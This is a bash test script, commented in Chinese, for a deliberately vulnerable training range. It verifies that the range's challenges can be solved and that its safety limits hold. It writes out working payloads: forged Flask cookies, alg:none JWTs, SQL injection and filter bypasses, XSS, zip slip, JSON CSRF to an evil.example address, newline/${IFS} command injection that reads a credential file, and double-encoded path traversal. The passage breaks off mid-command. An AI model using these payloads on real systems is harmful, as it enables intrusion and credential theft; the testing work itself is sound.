# ---- flask_session/forged_cookie —— 订阅后台提权
COOKIE=$(
  python3 - <<'PY'
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "vuln4all-demo-secret"
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
print(serializer.dumps({"user": "mallory", "plan": "enterprise", "admin": True}))
PY
)
if [ -n "$COOKIE" ]; then
  ok "用弱密钥签出了一个 session cookie"
else
  bad "签 cookie 失败"
fi

code=$(curl -s -o /tmp/v4a-forged.html -w '%{http_code}' \
  -b "v4a_flask_session_forged_cookie_main=$COOKIE" \
  "$BASE/v/flask_session/forged_cookie/admin")
expect_code "伪造 cookie 进管理员页（200）" "$code" "200"
expect_has "管理员页给出管理员控制台" "管理员控制台" "$(strip_teaching < /tmp/v4a-forged.html)"
expect_solved "flask_session/forged_cookie" "check() 确认会话伪造通关"

code=$(curl -s -o /dev/null -w '%{http_code}' \
  "$BASE/v/flask_session/forged_cookie/admin")
expect_code "不带 cookie 进不去（403）" "$code" "403"

# ---- race_condition/coupon_redeem —— 限时优惠券并发
expect_unsolved "race_condition/coupon_redeem" "并发之前 check() 说未通关"

seq 24 | xargs -P24 -I{} curl -s -o /dev/null -X POST \
  "$BASE/v/race_condition/coupon_redeem/redeem"
body=$(page "$BASE/v/race_condition/coupon_redeem/")
expect_has "并发把「每人一次」打破了" "这题通了" "$body"
expect_solved "race_condition/coupon_redeem" "check() 确认竞态通关"

# ---- jwt/alg_none —— 开放 API 平台
TOKEN=$(
  python3 - <<'PY'
import base64, json

def b64e(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

head = b64e(json.dumps({"alg": "none", "typ": "JWT"}).encode())
body = b64e(json.dumps({"user": "mallory", "role": "admin"}).encode())
print(head + "." + body + ".")
PY
)
code=$(curl -s -o /tmp/v4a-jwt.html -w '%{http_code}' \
  -H "Authorization: Bearer $TOKEN" "$BASE/v/jwt/alg_none/api/admin/keys")
expect_code "alg:none 的 token 通过了鉴权（200）" "$code" "200"
expect_has "管理员接口返回了密钥列表" "API 密钥" "$(strip_teaching < /tmp/v4a-jwt.html)"
expect_solved "jwt/alg_none" "check() 确认 alg:none 绕过通关"

code=$(curl -s -o /dev/null -w '%{http_code}' \
  "$BASE/v/jwt/alg_none/api/admin/keys")
expect_code "不带 token 进不去（401）" "$code" "401"

rm -f /tmp/v4a-forged.html /tmp/v4a-jwt.html

step "11. 运行配置（局域网 / 配置文件）"

out=$(python3 - <<'PY'
import sys
sys.path.insert(0, ".")
from pathlib import Path
from vuln4all import config

s, notes = config.resolve(Path("."), {"port": 70000})
print("越界端口 ->", s["port"], "有提示" if notes else "没提示")

print("回环识别 ->", [config.is_loopback(x) for x in
      ("127.0.0.1", "localhost.", "[::1]", "::ffff:127.0.0.1", "0.0.0.0")])

print("通配识别 ->", [config.is_wildcard(x) for x in ("0.0.0.0", "::", "127.0.0.1")])
PY
)
expect_has "越界端口退回默认值并给出提示" "越界端口 -> 8800 有提示" "$out"
expect_has "回环识别覆盖尾点/方括号/IPv4映射" "回环识别 -> [True, True, True, True, False]" "$out"
expect_has "通配地址识别" "通配识别 -> [True, True, False]" "$out"

# 配置文件里出现百分号，不能把整个文件丢掉（configparser 默认的 %-插值会）
cat >vuln4all.ini <<'CFG'
[vuln4all]
host = 0.0.0.0
port = 88%20
allow_remote = true
CFG
out=$(python3 - <<'PY'
import sys
sys.path.insert(0, ".")
from pathlib import Path
from vuln4all import config

s, notes = config.resolve(Path("."), {})
print("host ->", s["host"])
print("port ->", s["port"])
print("文件被丢掉了" if any("读 vuln4all.ini 失败" in n for n in notes) else "文件还在")
PY
)
expect_has "配置里的 % 不会连累其他键" "host -> 0.0.0.0" "$out"
expect_has "坏的 port 单独退回默认值" "port -> 8800" "$out"
expect_has "整个配置文件没有被丢掉" "文件还在" "$out"
rm -f vuln4all.ini

# --lan 不该把用户显式指定的 --host 悄悄放大
out=$(python3 - <<'PY'
import argparse, sys
sys.path.insert(0, ".")
from vuln4all.cli import build_parser

parser = build_parser()
for argv in (["run", "--lan"], ["run", "--lan", "--host", "192.168.1.5"]):
    args = parser.parse_args(argv)
    overrides = {k: getattr(args, k) for k in ("host", "port", "reload") if hasattr(args, k)}
    if args.lan and "host" not in overrides:
        overrides["host"] = "0.0.0.0"
    print(argv, "->", overrides.get("host"))
PY
)
expect_has "只给 --lan 时绑所有网卡" "['run', '--lan'] -> 0.0.0.0" "$out"
expect_has "同时给了 --host 时听 --host 的" "--host', '192.168.1.5'] -> 192.168.1.5" "$out"

# --no-reload 能关掉配置文件里的 reload
cat >vuln4all.ini <<'CFG'
[vuln4all]
reload = true
CFG
out=$(python3 - <<'PY'
import sys
sys.path.insert(0, ".")
from pathlib import Path
from vuln4all import config

print("只读 ini ->", config.resolve(Path("."), {})[0]["reload"])
print("--no-reload ->", config.resolve(Path("."), {"reload": False})[0]["reload"])
PY
)
expect_has "配置文件里的 reload 能生效" "只读 ini -> True" "$out"
expect_has "--no-reload 能盖掉它" "--no-reload -> False" "$out"
rm -f vuln4all.ini

step "12. 仓库卫生"
# 代码、模板、文档里不允许出现表情符号。加一条自动检查，免得以后回归。
hygiene=$(python3 - <<'PY'
import pathlib

RANGES = [
    (0x1F300, 0x1FAFF), (0x1F000, 0x1F2FF), (0x2600, 0x27BF),
    (0x2190, 0x21FF), (0x2B00, 0x2BFF), (0xFE0F, 0xFE0F),
    (0x2049, 0x2049), (0x203C, 0x203C), (0x1F1E6, 0x1F1FF),
]
# 这些是正常的中文排版符号，不算表情
ALLOW = set("·—…→←↑↓≥≤×÷°±§¶†‡•‰′″※「」『』【】《》〈〉“”‘’、。，；：？！（）")

def looks_like_emoji(ch):
    if ch in ALLOW:
        return False
    cp = ord(ch)
    return any(lo <= cp <= hi for lo, hi in RANGES)

hits = []
for path in sorted(pathlib.Path(".").rglob("*")):
    if not path.is_file():
        continue
    rel = path.relative_to(".").as_posix()
    if any(part in rel for part in (".git/", "__pycache__/", "workspace/")):
        continue
    try:
        text = path.read_text(encoding="utf-8")
    except (UnicodeDecodeError, OSError):
        continue
    for lineno, line in enumerate(text.splitlines(), 1):
        if any(looks_like_emoji(c) for c in line):
            hits.append("%s:%d" % (rel, lineno))

print("EMOJI_COUNT=%d" % len(hits))
for item in hits[:8]:
    print("  " + item)
PY
)
expect_has "代码和文档里没有表情符号" "EMOJI_COUNT=0" "$hygiene"

# 中文文案里混用 ASCII 双引号会把 Python 字符串截断。这个坑反复踩过好几次，
# 而报错行号常常差得老远（Python 会把整段当成一个跨行错误），所以专门查一遍。
# 指纹：Python 3 里中文是合法的标识符字符，被截断之后残余那截会变成 NAME token。
quotes=$(python3 - <<'PY'
import io, pathlib, re, sys, tokenize

PREFIX = re.compile(r'^([rRbBuUfF]{0,3})("""|\'\'\'|"|\')')
CJK = re.compile(r"[\u3000-\u303f\u4e00-\u9fff\uff00-\uffef]")

hits = []
for path in sorted(pathlib.Path(".").rglob("*.py")):
    rel = path.as_posix()
    if any(part in rel for part in (".git/", "__pycache__/", "workspace/")):
        continue
    src = path.read_text(encoding="utf-8")
    try:
        toks = list(tokenize.generate_tokens(io.StringIO(src).readline))
    except Exception:
        continue
    for tok in toks:
        if tok.type == tokenize.NAME and CJK.search(tok.string):
            hits.append("%s:%d" % (rel, tok.start[0]))
            continue
        if tok.type != tokenize.STRING:
            continue
        m = PREFIX.match(tok.string)
        if not m:
            continue
        prefix, quote = m.group(1), m.group(2)
        if len(quote) == 3 or quote != '"' or "r" in prefix.lower():
            continue
        body = tok.string[m.end():-1]
        if '"' in body.replace('\\"', "").replace("\\\\", ""):
            hits.append("%s:%d" % (rel, tok.start[0]))

print("QUOTE_COUNT=%d" % len(hits))
for item in hits[:8]:
    print("  " + item)
PY
)
expect_has "中文文案里没有混用 ASCII 双引号" "QUOTE_COUNT=0" "$quotes"

# 模板是 HTML，Markdown 的 **加粗** 不会渲染 —— 浏览器会原样显示星号。
bold=$(python3 - <<'PY'
import pathlib, re

PATTERN = re.compile(r"\*\*([^*\n]+)\*\*")
hits = []
for path in sorted(pathlib.Path(".").rglob("*.html")):
    rel = path.as_posix()
    if any(part in rel for part in (".git/", "__pycache__/", "workspace/")):
        continue
    for lineno, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
        if PATTERN.search(line):
            hits.append("%s:%d" % (rel, lineno))

print("BOLD_COUNT=%d" % len(hits))
for item in hits[:8]:
    print("  " + item)
PY
)
expect_has "模板里没有漏掉的 Markdown 加粗" "BOLD_COUNT=0" "$bold"

# info 里的说明文字走 |rich 渲染（只认 **加粗** 和 `等宽`）。
# 如果哪个字符串里出现落单的星号，那个地方在页面上会显示成字面星号 —— 查一遍。
# 注意 `UNION/**/SELECT` 这种是合法的（SQL 内联注释），渲染器有意不碰它。
rich=$(python3 - <<'PY'
import ast, pathlib, re, sys

sys.path.insert(0, ".")
from vuln4all.contract import _RICH_BOLD, _RICH_CODE

BAD = re.compile(r"\*\*")

hits = []
for path in sorted(pathlib.Path("modules").rglob("module.py")):
    if "__pycache__" in str(path):
        continue
    rel = path.as_posix()
    try:
        tree = ast.parse(path.read_text(encoding="utf-8"))
    except SyntaxError:
        continue                      # 语法错由别的检查报，这里不重复
    for node in ast.walk(tree):
        if not isinstance(node, ast.Dict):
            continue
        for k, v in zip(node.keys, node.values):
            if not isinstance(k, ast.Constant):
                continue
            if k.value not in ("description", "hint", "solution"):
                continue
            if not (isinstance(v, ast.Constant) and isinstance(v.value, str)):
                continue
            text = v.value
            # 按渲染器的方式过一遍：命中加粗/等宽的先挖掉，剩下的星号就是落单的
            left = _RICH_BOLD.sub("", text)
            left = _RICH_CODE.sub("", left)
            if BAD.search(left):
                for m in re.finditer(r".{0,25}\*\*.{0,25}", left):
                    hits.append("%s.%s  ...%s..." % (rel, k.value, m.group(0).replace("\n", " ")))
                    break

print("RICH_COUNT=%d" % len(hits))
for item in hits[:8]:
    print("  " + item)
PY
)
expect_has "info 里的说明文字没有落单的星号" "RICH_COUNT=0" "$rich"

# 光测过滤器不够 —— 直接看渲染出来的页面上强调有没有变成标签。
# （清单页和题目页是两个不同的 app，两边都得注册 |rich，漏一边就会 500。）
raw_card=$(curl -s "$BASE/")
expect_has "清单页把说明文字里的强调渲染成了 strong" "<strong>" "$raw_card"
expect_no "清单页上没有字面的 ** 残留" "**" "$raw_card"

raw_mod=$(curl -s "$BASE/v/business_logic/coupon_stacking/")
expect_has "题目页把 hint/solution 里的强调渲染成了 strong" "<strong>" "$raw_mod"
expect_no "题目页上没有字面的 ** 残留" "**" "$raw_mod"

# 面向别人的文档里不该出现内网地址、明文口令这类只属于某一套环境的信息。
# （靶场题目内容里的假内网地址是有意为之，所以这里只扫 README 和 docs/。）
leak=$(python3 - <<'PY'
import pathlib, re

PATTERNS = [
    (re.compile(r"\b10\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"), "内网地址"),
    (re.compile(r"\b172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}\b"), "内网地址"),
    (re.compile(r"\b192\.168\.\d{1,3}\.\d{1,3}\b"), "内网地址"),
    # --password 后面跟的是字面值（尖括号包裹的占位符不算）
    (re.compile(r"--password[ \t]+[^\s<]"), "明文口令参数"),
]

targets = [pathlib.Path("README.md")]
docs = pathlib.Path("docs")
if docs.is_dir():
    targets.extend(sorted(docs.rglob("*.md")))

hits = []
for path in targets:
    if not path.is_file():
        continue
    for lineno, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
        for pattern, label in PATTERNS:
            if pattern.search(line):
                hits.append("%s:%d (%s) %s" % (path.as_posix(), lineno, label, line.strip()[:60]))

print("LEAK_COUNT=%d" % len(hits))
for item in hits[:5]:
    print("  " + item)
PY
)
expect_has "文档里没有内网地址 / 明文口令" "LEAK_COUNT=0" "$leak"

step "13. 深度阶梯：同一分类下的第二、第三道题"

# ---- sqli/union_query：没有报错回显，得靠 ORDER BY 数 + UNION 接表
expect_unsolved "sqli/union_query" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/sqli/union_query/" --data-urlencode "keyword=键盘")
expect_has "正常搜索能出商品" "机械键盘" "$body"

body=$(page -X POST "$BASE/v/sqli/union_query/" --data-urlencode "keyword=键盘' ORDER BY 4 -- ")
expect_no "列数越界时结果为空" "机械键盘" "$body"
expect_no "而且不回显数据库报错" "sqlite3" "$body"

body=$(page -X POST "$BASE/v/sqli/union_query/" --data-urlencode "keyword=键盘' UNION SELECT 1,2,3 -- ")
expect_has "列数对上之后语句又有效了" "机械键盘" "$body"
expect_unsolved "sqli/union_query" "只找到显示位还不算通关（阶梯没塌）"

body=$(page -X POST "$BASE/v/sqli/union_query/" \
  --data-urlencode "keyword=键盘' UNION SELECT username, password, role FROM users -- ")
expect_has "UNION 把 users 表接出来了" "S3cr3t-1nj3ct3d" "$body"
expect_unsolved "sqli/union_query" "接出了数据但没提交密码，仍不算通关"

curl -s -o /dev/null -X POST "$BASE/v/sqli/union_query/" --data-urlencode "guess=wrong1"
expect_unsolved "sqli/union_query" "密码填错不算通关"

curl -s -o /dev/null -X POST "$BASE/v/sqli/union_query/" \
  --data-urlencode "guess=S3cr3t-1nj3ct3d"
expect_solved "sqli/union_query" "check() 确认两个目标都达成"

# 密码表单的字段名是模板里的，光用 curl 直接 POST guess 验不到它接得对不对
body=$(page "$BASE/v/sqli/union_query/")
expect_has "页面上那个提交框的字段名对得上" 'name="guess"' "$body"

# ---- sqli/time_blind：页面永远一样，只剩时间这一个信号
expect_unsolved "sqli/time_blind" "动手之前 check() 说未通关"

t_normal=$(curl -s -o /dev/null -w '%{time_total}' -X POST "$BASE/v/sqli/time_blind/" \
  --data-urlencode "badge=A1001")
t_slow=$(curl -s -o /dev/null -w '%{time_total}' -X POST "$BASE/v/sqli/time_blind/" \
  --data-urlencode "badge=' OR sleep(2) -- ")
expect_lt "普通查询很快返回" "$t_normal" "1.5"
expect_ge "塞进 sleep(2) 之后明显变慢" "$t_slow" "2.5"

# 单次 sleep() 参数封顶是不够的：SQLite 按行求值（3 行），payload 还能连着写好几个。
# 这一题用的是"每次请求的总睡眠预算"，所以 3 × sleep(60) 也只该花预算那么多。
t_bomb=$(curl -s -o /dev/null -w '%{time_total}' -X POST "$BASE/v/sqli/time_blind/" \
  --data-urlencode "badge=' OR sleep(60) -- ")
expect_lt "一个请求塞 sleep(60) 会被总预算截住" "$t_bomb" "20"

body=$(page -X POST "$BASE/v/sqli/time_blind/" --data-urlencode "badge=' OR sleep(2) -- ")
expect_has "页面本身永远说同一句话" "查询完成" "$body"

code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/v/sqli/time_blind/" \
  --data-urlencode "guess=wrong1")
expect_code "提交一个错密码" "$code" "200"
expect_unsolved "sqli/time_blind" "猜错密码不算通关（第二个目标还没达成）"

curl -s -o /dev/null -X POST "$BASE/v/sqli/time_blind/" --data-urlencode "guess=k3y9f2"
expect_solved "sqli/time_blind" "check() 确认两个目标都达成"

# ---- xss/stored_guestbook：payload 存在服务器上，刷新还在
expect_unsolved "xss/stored_guestbook" "动手之前 check() 说未通关"

curl -s -o /dev/null -X POST "$BASE/v/xss/stored_guestbook/" \
  --data-urlencode "author=测试" --data-urlencode "body=<img src=x onerror=alert(1)>"

# 重新取一次页面，URL 里什么都不带
body=$(page "$BASE/v/xss/stored_guestbook/")
expect_has "payload 留在服务器上，刷新后照样渲染" "onerror=alert(1)" "$body"
expect_solved "xss/stored_guestbook" "check() 确认存储型 XSS 通关"

# ---- xss/dom_based：payload 不在响应体里
expect_unsolved "xss/dom_based" "动手之前 check() 说未通关"

body=$(page --get "$BASE/v/xss/dom_based/" \
  --data-urlencode "name=<img src=x onerror=alert(1)>")
expect_no "响应体里找不到 payload —— DOM 型就是这样" "onerror=alert(1)" "$body"
expect_has "页面自己承认响应体里没有它" "没有" "$body"

# reset 之后单独验 fragment 那条路：它不经过服务端，靠页面自己回报
curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=xss/dom_based" --data-urlencode "next=/"
expect_unsolved "xss/dom_based" "reset 之后回到未通关"

# 回报地址**从页面里读**，不要硬编码：页面里的 JS 用的是 url_for()，
# 前缀一旦算错，浏览器那边就是个静默 404，而硬编码的断言照样会绿。
dom_page=$(page "$BASE/v/xss/dom_based/")
hit=$(printf '%s' "$dom_page" | grep -oE 'fetch\("[^"]*"' | head -n1 | cut -d'"' -f2)
if [ -n "$hit" ]; then
  ok "从页面里读到了 fragment 回报地址（$hit）"
else
  bad "页面里找不到 fragment 回报地址 —— url_for 那条线断了"
fi

code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE$hit")
expect_code "空 POST 会被回报端点拒掉" "$code" "400"
expect_unsolved "xss/dom_based" "空 POST 不算通关"

code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE$hit" \
  -H "Content-Type: application/json" \
  --data-raw '{"hash":"<img src=x onerror=alert(1)>"}')
expect_code "带着 fragment 内容回报的通路可达" "$code" "200"
expect_solved "xss/dom_based" "fragment（#...）那条路也算通关"

# 再 reset 一次，用查询参数那条路走一遍
curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=xss/dom_based" --data-urlencode "next=/"
body=$(page --get "$BASE/v/xss/dom_based/" \
  --data-urlencode "name=<img src=x onerror=alert(1)>")
expect_solved "xss/dom_based" "?name= 那条路同样算通关"

# ---- idor/admin_endpoint：垂直越权
expect_unsolved "idor/admin_endpoint" "动手之前 check() 说未通关"

code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/v/idor/admin_endpoint/admin/export")
expect_code "匿名访问管理接口会被踢回登录（302）" "$code" "302"

curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/idor/admin_endpoint/login" \
  --data-urlencode "user=bob" --data-urlencode "password=bob123"

body=$(page -b "$JAR" "$BASE/v/idor/admin_endpoint/console")
expect_has "控制台 HTML 里躺着管理员入口" "admin/export" "$body"
expect_has "它只是被 display:none 藏起来了" "display:none" "$body"

code=$(curl -s -o /tmp/v4a-idor.html -w '%{http_code}' -b "$JAR" \
  "$BASE/v/idor/admin_endpoint/admin/export")
expect_code "普通用户直接访问管理接口 —— 200" "$code" "200"
expect_has "拿到了全员的薪资数据" "月薪" "$(strip_teaching < /tmp/v4a-idor.html)"
expect_solved "idor/admin_endpoint" "check() 确认垂直越权通关"
rm -f "$JAR" /tmp/v4a-idor.html

# ---- upload/zip_slip：压缩包里的成员名被当成了路径
python3 - <<'PY'
import zipfile

# 成员名可以完全由我们指定 —— 命令行 zip 工具会规范化掉，所以要手搓
with zipfile.ZipFile("/tmp/v4a-evil.zip", "w") as archive:
    archive.writestr(zipfile.ZipInfo("../运营公告/公告.txt"), "这条公告已经被改了")
PY
expect_unsolved "upload/zip_slip" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/upload/zip_slip/" \
  -F "package=@/tmp/v4a-evil.zip;type=application/zip")
expect_has "解压结果里标出了越界的成员" "落到上传目录外面的" "$body"
expect_solved "upload/zip_slip" "check() 确认 Zip Slip 通关"

body=$(page "$BASE/v/upload/zip_slip/")
expect_has "被保护的那条公告确实被覆盖了" "这条公告已经被改了" "$body"
rm -f /tmp/v4a-evil.zip

# ---- csrf/json_api：表单发不出 JSON，但可以"长得像 JSON"
expect_unsolved "csrf/json_api" "动手之前 check() 说未通关"

curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/csrf/json_api/login" \
  --data-urlencode "user=bob" --data-urlencode "password=bob123"

# 反向一步：不带 Referer 的请求会被接受，但那不是跨站请求伪造
code=$(curl -s -o /dev/null -w '%{http_code}' -b "$JAR" -X POST \
  -H "Content-Type: application/json" --data-raw '{"email":"silent@corp.example"}' \
  "$BASE/v/csrf/json_api/api/email")
expect_code "接口接受 JSON 请求" "$code" "200"
expect_unsolved "csrf/json_api" "光用 curl（没有 Referer）不算 CSRF"

# 真正的攻击形态：Content-Type 是 text/plain，请求体却长得像 JSON
code=$(curl -s -o /dev/null -w '%{http_code}' -b "$JAR" -X POST \
  -H "Content-Type: text/plain" \
  -H "Referer: $BASE/evil-json/" \
  --data-raw '{"email":"attacker@evil.example","ignore":"="}' \
  "$BASE/v/csrf/json_api/api/email")
expect_code "长得像 JSON 的 text/plain 请求被接受" "$code" "200"
expect_solved "csrf/json_api" "check() 确认 JSON CSRF 通关"

body=$(page -b "$JAR" "$BASE/v/csrf/json_api/profile")
expect_has "邮箱确实被改成了攻击者的值" "attacker@evil.example" "$body"
rm -f "$JAR"

step "14. 绕过专题：过滤器拦住了什么，又是怎么绕过去的"

# ---- sqli/keyword_filter：规则按"字面量"匹配，不是按"结构"
expect_unsolved "sqli/keyword_filter" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/sqli/keyword_filter/" --data-urlencode "keyword=张")
expect_has "正常搜索能出员工" "张三" "$body"

body=$(page -X POST "$BASE/v/sqli/keyword_filter/" \
  --data-urlencode "keyword=x' UNION SELECT username,password,role FROM users-- ")
expect_has "经典 payload 被「注释」规则拦下" "注释" "$body"
expect_no "被拦时连结果都不给" "张三" "$body"

body=$(page -X POST "$BASE/v/sqli/keyword_filter/" \
  --data-urlencode "keyword=x' UNION  SELECT username,password,role FROM users WHERE 1=1 OR 'a'='a")
expect_has "用 OR 的写法被「布尔运算」规则拦下" "布尔运算" "$body"

body=$(page -X POST "$BASE/v/sqli/keyword_filter/" \
  --data-urlencode "keyword=x' UNION  SELECT name,1,1 FROM sqlite_master")
expect_has "查系统表被「系统表」规则拦下" "系统表" "$body"

# 那条规则只认"union 后面跟**一个**空格再跟 select"
body=$(page -X POST "$BASE/v/sqli/keyword_filter/" \
  --data-urlencode "keyword=x' UNION  SELECT username,password,role FROM users WHERE 'b'LIKE'b")
expect_no "双空格 payload 一条规则都没命中" "被安全策略拦截" "$body"
expect_has "users 表被接出来了" "S3cr3t-1nj3ct3d" "$body"
expect_unsolved "sqli/keyword_filter" "绕过了过滤器但还没提交密码"

# 阶梯没塌：`UNION SELECT 1,2,3`（找显示位那一步）只达成目标一，不算通关
body=$(page -X POST "$BASE/v/sqli/keyword_filter/" \
  --data-urlencode "keyword=x' UNION  SELECT 1,2,3 WHERE 'b'LIKE'b")
expect_unsolved "sqli/keyword_filter" "只找到显示位还不算通关（阶梯没塌）"

# 制表符 / 换行 是等价的另外两种绕过
for sep_name in 制表符 换行; do
  if [ "$sep_name" = "制表符" ]; then
    kw=$(printf "x' UNION\tSELECT username,password,role FROM users WHERE 'b'LIKE'b")
  else
    kw=$(printf "x' UNION\nSELECT username,password,role FROM users WHERE 'b'LIKE'b")
  fi
  body=$(page -X POST "$BASE/v/sqli/keyword_filter/" --data-urlencode "keyword=$kw")
  expect_has "$sep_name 分隔同样能绕过" "S3cr3t-1nj3ct3d" "$body"
done

curl -s -o /dev/null -X POST "$BASE/v/sqli/keyword_filter/" \
  --data-urlencode "guess=S3cr3t-1nj3ct3d"
expect_solved "sqli/keyword_filter" "check() 确认两个目标都达成"

# ---- xss/tag_filter：删除式过滤器是可逆的
expect_unsolved "xss/tag_filter" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/xss/tag_filter/" \
  --data-urlencode "author=测试" --data-urlencode "body=<script>fetch(1)</script>")
expect_has "script 标签被过滤器认出来了" "script 标签" "$body"
expect_unsolved "xss/tag_filter" "老老实实写 script 标签不管用"

# 反向：光写一行带 `on...=` 的纯文本不能被判成通关。
# （判定检测器早先只写 `on\w+=`，结果这种东西会被误判 —— 实测踩出来的。）
body=$(page -X POST "$BASE/v/xss/tag_filter/" \
  --data-urlencode "author=测试" --data-urlencode "body=onerror= 只是文字，不是标签")
expect_unsolved "xss/tag_filter" "纯文本里的 onerror= 不算打通"

# 路子一：嵌套写法，让它删完自己拼回一个完整标签
nested='<scr<script>ipt>fetch(1)</scr</script>ipt>'
body=$(page -X POST "$BASE/v/xss/tag_filter/" \
  --data-urlencode "author=测试" --data-urlencode "body=$nested")
expect_has "嵌套写法让过滤器把 script 标签拼了回来" \
  "&lt;script&gt;fetch(1)&lt;/script&gt;" "$body"
expect_solved "xss/tag_filter" "check() 确认删除式过滤器被绕过"

# 路子二：srcdoc 容器，把 payload 编码起来塞进去
curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=xss/tag_filter" --data-urlencode "next=/"
expect_unsolved "xss/tag_filter" "reset 之后回到未通关"

body=$(page -X POST "$BASE/v/xss/tag_filter/" \
  --data-urlencode "author=测试" \
  --data-urlencode 'body=<iframe srcdoc="&lt;svg/onload=fetch(1)&gt;"></iframe>')
expect_has "srcdoc 里的编码 payload 原样存进去了" "srcdoc" "$body"
expect_solved "xss/tag_filter" "srcdoc 那条路同样算通关"

# ---- command_injection/space_filter：黑名单漏了换行
expect_unsolved "command_injection/space_filter" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/command_injection/space_filter/" \
  --data-urlencode "target=127.0.0.1; id")
expect_has "分号被「分号」规则拦下" "分号" "$body"

body=$(page -X POST "$BASE/v/command_injection/space_filter/" \
  --data-urlencode "target=127.0.0.1 | id")
expect_has "管道被「管道与后台」规则拦下" "管道与后台" "$body"

# 换行是 shell 里跟分号等价的分隔符，而过滤器没拦它
inj=$(printf '127.0.0.1\nid')
body=$(page -X POST "$BASE/v/command_injection/space_filter/" --data-urlencode "target=$inj")
expect_no "换行 payload 不被拦" "被安全策略拦截" "$body"
expect_has "id 真的跑起来了" "uid=" "$body"

# ${IFS} 替空格。这里必须用单引号，否则 bash 会先把 ${IFS} 展开掉
inj=$(printf '127.0.0.1\nhead${IFS}-c${IFS}20${IFS}/etc/hostname')
body=$(page -X POST "$BASE/v/command_injection/space_filter/" --data-urlencode "target=$inj")
expect_no '${IFS} 替空格的 payload 不被拦' "被安全策略拦截" "$body"
expect_has 'head 被跑起来了（换行 + ${IFS} 都对）' "hostname" "$body"

# 真的在跑 shell，所以得自己把输出量夹住 —— /dev/zero 不能撑爆内存和磁盘
inj=$(printf '127.0.0.1\ncat${IFS}/dev/zero')
body=$(page -X POST "$BASE/v/command_injection/space_filter/" --data-urlencode "target=$inj")
expect_has "吐不完的输出被 head 截住了" "输出过长" "$body"
expect_unsolved "command_injection/space_filter" "输出一堆 \\0 不算通关"

# 目标文件的完整路径从页面里读，别硬编码 —— 页面上那条线断了要能发现
sp_page=$(page "$BASE/v/command_injection/space_filter/")
secret=$(printf '%s' "$sp_page" | grep -oE '/[^ <>"|]*ops-token\.txt' | head -n1)
if [ -n "$secret" ]; then
  ok "从页面里读到了目标文件路径（$secret）"
else
  bad "页面里找不到目标文件路径"
fi

inj=$(printf '127.0.0.1\nhead${IFS}-c${IFS}300${IFS}%s' "$secret")
body=$(page -X POST "$BASE/v/command_injection/space_filter/" --data-urlencode "target=$inj")
expect_has "读到了内部凭据" "OPS-TOKEN-7f3a91c4" "$body"
expect_solved "command_injection/space_filter" "check() 确认执行日志里有凭据"

# ---- path_traversal/encoding_filter：过滤器和解码层没对齐
expect_unsolved "path_traversal/encoding_filter" "动手之前 check() 说未通关"

body=$(page "$BASE/v/path_traversal/encoding_filter/download?file=readme.txt")
expect_has "共享目录里的文件正常能下" "对外共享的资料" "$body"

body=$(page "$BASE/v/path_traversal/encoding_filter/download?file=..%2fprivate%2fops-token.txt")
expect_has "单次编码的 ../ 被「上级目录」规则拦下" "上级目录" "$body"

body=$(page "$BASE/v/path_traversal/encoding_filter/download?file=%252e%252e%252fprivate%252fops-token.txt")
expect_has "路径绕过去了，但文件名里的敏感词还被拦" "敏感文件名" "$body"

body=$(page "$BASE/v/path_traversal/encoding_filter/download?file=%252e%252e%252fprivate%252fops-%2574oken.txt")
expect_has "路径和文件名都双重编码之后穿过去了" "NETDISK-TOKEN-9c41b7" "$body"
expect_solved "path_traversal/encoding_filter" "check() 确认穿越成功"

# 双编码同样能构造出绝对路径。设备文件必须被挡住 —— 不然一个请求
# 就能把 worker 挂在 `read_text()` 上永远读不完。
code=$(curl -s -o /dev/null -w '%{http_code}' \
  "$BASE/v/path_traversal/encoding_filter/download?file=%252fdev%252fzero")
expect_code "双编码成 /dev/zero 不会挂住，而且被挡住" "$code" "200"
body=$(page "$BASE/v/path_traversal/encoding_filter/download?file=%252fdev%252fzero")
expect_has "设备文件被挡在普通文件检查之外" "不是普通文件" "$body"

# ---- ssrf/ip_format_filter：地址不是字符串
expect_unsolved "ssrf/ip_format_filter" "动手之前 check() 说未通关"

body=$(page "$BASE/intranet/")
expect_has "内网后台本身是可达的" "INTRANET-ADMIN-4e82d1" "$body"

# 内网后台的端口**从页面里读**，别用脚本自己的 $PORT：
# 页面上的地址是模块用 request.host 算出来的，算错了（比如漏了端口）
# 这条线就断了，而硬编码的断言照样会绿。
ssrf_page=$(page "$BASE/v/ssrf/ip_format_filter/")
intranet_url=$(printf '%s' "$ssrf_page" \
  | grep -oE 'http://127\.0\.0\.1:[0-9]+/intranet/' | head -n1)
iport=$(printf '%s' "$intranet_url" | sed -E 's#.*:([0-9]+)/intranet/#\1#')
if [ "$iport" = "$PORT" ]; then
  ok "页面上算出来的内网后台端口是对的（$iport）"
else
  bad "页面算出的端口是「$iport」，跟靶场实际端口 $PORT 对不上 —— 那条线断了"
fi

body=$(page -X POST "$BASE/v/ssrf/ip_format_filter/" \
  --data-urlencode "url=http://127.0.0.1:${iport}/intranet/")
expect_has "明文 127.0.0.1 被「回环地址字面量」拦下" "回环地址字面量" "$body"

body=$(page -X POST "$BASE/v/ssrf/ip_format_filter/" \
  --data-urlencode "url=http://localhost:${iport}/intranet/")
expect_has "localhost 同样被拦" "回环地址字面量" "$body"

body=$(page -X POST "$BASE/v/ssrf/ip_format_filter/" \
